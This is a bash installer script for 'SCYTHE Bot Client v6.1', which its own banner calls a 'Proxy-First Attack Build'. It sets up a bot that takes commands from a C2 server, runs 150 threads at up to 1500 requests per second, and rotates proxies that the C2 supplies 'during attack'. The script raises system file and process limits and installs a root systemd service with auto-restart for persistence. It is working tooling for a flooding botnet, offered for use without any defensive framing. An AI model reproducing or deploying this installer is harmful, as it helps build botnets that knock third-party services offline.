#!/bin/bash
# ================================================================
# SCYTHE Bot Client v6.1 — Proxy-First Auto Installer
# Features: ulimit setup, systemd service, log rotation, requirements
#           SOCKS proxy support, proxy validation, auto-scrap
# ================================================================

set -e

# ========== COLOR CODES ==========
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# ========== CONFIG ==========
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ========== FUNCTIONS ==========

print_banner() {
    echo -e "${CYAN}"
    echo "  ███████╗ ██████╗██╗   ██╗████████╗██╗  ██╗███████╗"
    echo "  ██╔════╝██╔════╝╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔════╝"
    echo "  ███████╗██║      ╚████╔╝    ██║   ███████║█████╗  "
    echo "  ╚════██║██║       ╚██╔╝     ██║   ██╔══██║██╔══╝  "
    echo "  ███████║╚██████╗   ██║      ██║   ██║  ██║███████╗"
    echo "  ╚══════╝ ╚═════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚══════╝"
    echo -e "${NC}"
    echo -e "${BOLD}${GREEN}  SCYTHE Bot Client v6.1 — Proxy-First Attack Build${NC}"
    echo -e "${CYAN}  ⚡ Token Bucket | 150 Threads | Bandwidth-Aware | Systemd${NC}"
    echo -e "${CYAN}  🔒 Proxy-First Mode | SOCKS Support | Smart Rotation${NC}"
    echo ""
}

check_root() {
    echo -e "${YELLOW}🔍 Checking privileges...${NC}"
    if [[ "$EUID" -ne 0 ]]; then
        echo -e "${YELLOW}⚠️  Not running as root. Some features (ulimit permanent, systemd) may fail.${NC}"
        echo -e "${YELLOW}   Recommend: sudo ./installbot.sh${NC}"
        sleep 2
    else
        echo -e "${GREEN}✅ Running as root.${NC}"
    fi
}

check_os() {
    echo -e "${YELLOW}🔍 Checking OS...${NC}"
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
        if [ -f /etc/os-release ]; then
            . /etc/os-release
            echo -e "${GREEN}✅ Linux detected: $NAME $VERSION_ID${NC}"
        else
            echo -e "${GREEN}✅ Linux detected.${NC}"
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        echo -e "${GREEN}✅ macOS detected.${NC}"
    else
        echo -e "${RED}❌ Unsupported OS: $OSTYPE${NC}"
        exit 1
    fi
}

check_python() {
    echo -e "${YELLOW}🔍 Checking Python...${NC}"
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}❌ Python3 not found. Installing...${NC}"
        install_python
    fi
    PYTHON_VER=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
    echo -e "${GREEN}✅ Python $PYTHON_VER detected.${NC}"
    if python3 -c "import sys; exit(0 if sys.version_info >= (3,10) else 1)"; then
        echo -e "${GREEN}✅ Python version OK (3.10+).${NC}"
    else
        echo -e "${RED}❌ Python $PYTHON_VER is too old. Need 3.10+${NC}"
        exit 1
    fi
}

install_python() {
    if [[ "$OS" == "linux" ]]; then
        if command -v apt &> /dev/null; then
            apt update -y && apt install -y python3 python3-pip python3-venv
        elif command -v yum &> /dev/null; then
            yum install -y python3 python3-pip
        elif command -v dnf &> /dev/null; then
            dnf install -y python3 python3-pip
        else
            echo -e "${RED}❌ Cannot install Python automatically.${NC}"
            exit 1
        fi
    fi
}

install_system_packages() {
    echo -e "${YELLOW}📦 Installing system packages...${NC}"
    if [[ "$OS" == "linux" ]]; then
        if command -v apt &> /dev/null; then
            apt update -y
            apt install -y python3-venv python3-pip bc
        elif command -v yum &> /dev/null; then
            yum install -y python3 python3-pip bc
        elif command -v dnf &> /dev/null; then
            dnf install -y python3 python3-pip bc
        else
            echo -e "${YELLOW}⚠️  Cannot install packages automatically. Please install python3-venv, pip, bc manually.${NC}"
        fi
    fi
    echo -e "${GREEN}✅ System packages installed.${NC}"
}

setup_ulimit() {
    echo -e "${YELLOW}🔧 Setting up ulimit (file descriptors & processes)...${NC}"

    CURRENT_NOFILE=$(ulimit -n)
    CURRENT_NPROC=$(ulimit -u)
    echo -e "   Current ulimit -n: ${CYAN}$CURRENT_NOFILE${NC}"
    echo -e "   Current ulimit -u: ${CYAN}$CURRENT_NPROC${NC}"

    ulimit -n 65535 2>/dev/null || echo -e "${YELLOW}⚠️  Could not set ulimit -n temporarily${NC}"
    ulimit -u 65535 2>/dev/null || echo -e "${YELLOW}⚠️  Could not set ulimit -u temporarily${NC}"

    if [[ "$EUID" -eq 0 ]]; then
        LIMITS_FILE="/etc/security/limits.conf"

        if [ -f "$LIMITS_FILE" ]; then
            cp "$LIMITS_FILE" "$LIMITS_FILE.bak.$(date +%s)" 2>/dev/null || true
        fi

        if ! grep -q "^\* soft nofile 65535" "$LIMITS_FILE" 2>/dev/null; then
            echo "* soft nofile 65535" >> "$LIMITS_FILE"
            echo "* hard nofile 65535" >> "$LIMITS_FILE"
            echo "* soft nproc 65535" >> "$LIMITS_FILE"
            echo "* hard nproc 65535" >> "$LIMITS_FILE"
            echo "root soft nofile 65535" >> "$LIMITS_FILE"
            echo "root hard nofile 65535" >> "$LIMITS_FILE"
            echo "root soft nproc 65535" >> "$LIMITS_FILE"
            echo "root hard nproc 65535" >> "$LIMITS_FILE"
            echo -e "${GREEN}✅ Permanent ulimit set in $LIMITS_FILE${NC}"
        else
            echo -e "${GREEN}✅ Permanent ulimit already configured.${NC}"
        fi

        SYSCTL_FILE="/etc/sysctl.conf"
        if ! grep -q "fs.file-max = 2097152" "$SYSCTL_FILE" 2>/dev/null; then
            echo "fs.file-max = 2097152" >> "$SYSCTL_FILE"
            sysctl -p 2>/dev/null || true
            echo -e "${GREEN}✅ fs.file-max set to 2097152${NC}"
        fi
    else
        echo -e "${YELLOW}⚠️  Skipping permanent ulimit (not root). Run with sudo for permanent setup.${NC}"
        echo -e "${YELLOW}   Temporary ulimit applied for this session only.${NC}"
    fi

    NEW_NOFILE=$(ulimit -n)
    NEW_NPROC=$(ulimit -u)
    echo -e "   New ulimit -n: ${GREEN}$NEW_NOFILE${NC}"
    echo -e "   New ulimit -u: ${GREEN}$NEW_NPROC${NC}"
}

create_venv() {
    echo -e "${YELLOW}📦 Setting up virtual environment...${NC}"
    if [ -d "venv" ]; then
        echo -e "${YELLOW}⚠️  venv already exists. Removing old...${NC}"
        rm -rf venv
    fi
    python3 -m venv venv
    source venv/bin/activate
    echo -e "${GREEN}✅ Virtual environment created.${NC}"
}

create_requirements() {
    echo -e "${YELLOW}📝 Creating requirements.txt...${NC}"
    cat > requirements.txt <<'EOF'
requests>=2.31.0
urllib3>=2.0.0
psutil>=5.9.0
requests[socks]>=2.31.0
EOF
    echo -e "${GREEN}✅ requirements.txt created.${NC}"
}

install_requirements() {
    echo -e "${YELLOW}📦 Installing Python dependencies...${NC}"
    if [ ! -f "requirements.txt" ]; then
        create_requirements
    fi
    source venv/bin/activate
    pip install --upgrade pip -q
    pip install -r requirements.txt -q
    echo -e "${GREEN}✅ Dependencies installed.${NC}"

    # Verify SOCKS support
    echo -e "${YELLOW}🔍 Verifying SOCKS support...${NC}"
    if python3 -c "import requests; from requests.adapters import SOCKSProxyManager; print('SOCKS OK')" 2>/dev/null; then
        echo -e "${GREEN}✅ SOCKS proxy support verified.${NC}"
    else
        echo -e "${YELLOW}⚠️  SOCKS support check skipped (optional).${NC}"
    fi
}

configure_bot() {
    echo -e "${YELLOW}🔧 Configuring bot...${NC}"
    C2_IP=${1:-"127.0.0.1"}
    C2_PORT=${2:-4884}
    BOT_ID=${3:-$(hostname)}
    THREADS=${4:-150}
    RPS_LIMIT=${5:-1500}

    cat > config.ini <<EOF
[C2]
IP = $C2_IP
PORT = $C2_PORT
ID = $BOT_ID
THREADS = $THREADS
RPS_LIMIT = $RPS_LIMIT
BANDWIDTH_LIMIT_MB = 0

# PROXY SETTINGS
# Proxies are auto-fetched from C2 server during attack
# Do NOT modify — proxy list is managed by C2
# Format received: ["http://ip:port", "socks5://ip:port", ...]
EOF
    echo -e "${GREEN}✅ config.ini created.${NC}"
    echo -e "   C2 IP      : ${CYAN}$C2_IP${NC}"
    echo -e "   Port       : ${CYAN}$C2_PORT${NC}"
    echo -e "   Bot ID     : ${CYAN}$BOT_ID${NC}"
    echo -e "   Threads    : ${CYAN}$THREADS${NC}"
    echo -e "   RPS Limit  : ${CYAN}$RPS_LIMIT${NC}"
}

create_start_script() {
    echo -e "${YELLOW}📝 Creating start.sh...${NC}"
    cat > start.sh <<'EOF'
#!/bin/bash
cd "$(dirname "$0")"
while true; do
    source venv/bin/activate
    python3 bot.py
    EXIT_CODE=$?
    if [ $EXIT_CODE -eq 0 ]; then
        echo "Bot exited normally. Restarting in 5s..."
    else
        echo "Bot crashed (code $EXIT_CODE). Restarting in 5s..."
    fi
    sleep 5
done
EOF
    chmod +x start.sh
    echo -e "${GREEN}✅ start.sh created.${NC}"
}

create_systemd_service() {
    echo -e "${YELLOW}🔧 Creating systemd service...${NC}"
    if [[ "$EUID" -ne 0 ]]; then
        echo -e "${YELLOW}⚠️  Skipping systemd (not root). Run with sudo to install service.${NC}"
        return
    fi

    SERVICE_NAME="scythe-bot"
    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=SCYTHE Bot Client
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$SCRIPT_DIR
ExecStart=$SCRIPT_DIR/venv/bin/python3 $SCRIPT_DIR/bot.py
Restart=always
RestartSec=5
StandardOutput=append:$SCRIPT_DIR/logs/bot.log
StandardError=append:$SCRIPT_DIR/logs/bot.log

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME" 2>/dev/null || true
    echo -e "${GREEN}✅ Systemd service created: $SERVICE_NAME${NC}"
    echo -e "   Start: ${CYAN}systemctl start $SERVICE_NAME${NC}"
    echo -e "   Stop:  ${CYAN}systemctl stop $SERVICE_NAME${NC}"
    echo -e "   Status:${CYAN} systemctl status $SERVICE_NAME${NC}"
    echo -e "   Logs:  ${CYAN}journalctl -u $SERVICE_NAME -f${NC}"
}

show_success() {
    echo ""
    echo -e "${GREEN}${BOLD}✅ Installation complete!${NC}"
    echo ""
    echo -e "${CYAN}=========================================${NC}"
    echo -e "${BOLD}🚀 Next steps:${NC}"
    echo ""
    echo -e "  ${BOLD}Quick Start (manual):${NC}"
    echo -e "     ${YELLOW}./start.sh${NC}"
    echo ""
    echo -e "  ${BOLD}Run once with override:${NC}"
    echo -e "     ${YELLOW}source venv/bin/activate${NC}"
    echo -e "     ${YELLOW}python3 bot.py <C2_IP> <C2_PORT> <BOT_ID>${NC}"
    echo ""
    echo -e "  ${BOLD}Systemd (auto-start on boot):${NC}"
    echo -e "     ${YELLOW}systemctl start scythe-bot${NC}"
    echo -e "     ${YELLOW}systemctl enable scythe-bot${NC}"
    echo ""
    echo -e "  ${BOLD}Check logs:${NC}"
    echo -e "     ${YELLOW}tail -f logs/bot.log${NC}"
    echo ""
    echo -e "  ${BOLD}Edit config:${NC}"
    echo -e "     ${YELLOW}nano config.ini${NC}"
    echo ""
    echo -e "${CYAN}=========================================${NC}"
    echo -e "${GREEN}Happy hacking! 🔥${NC}"
}

# ========== MAIN ==========
print_banner
check_root
check_os
check_python
install_system_packages
setup_ulimit
create_venv
create_requirements
install_requirements
configure_bot "$@"
create_start_script
create_systemd_service
show_success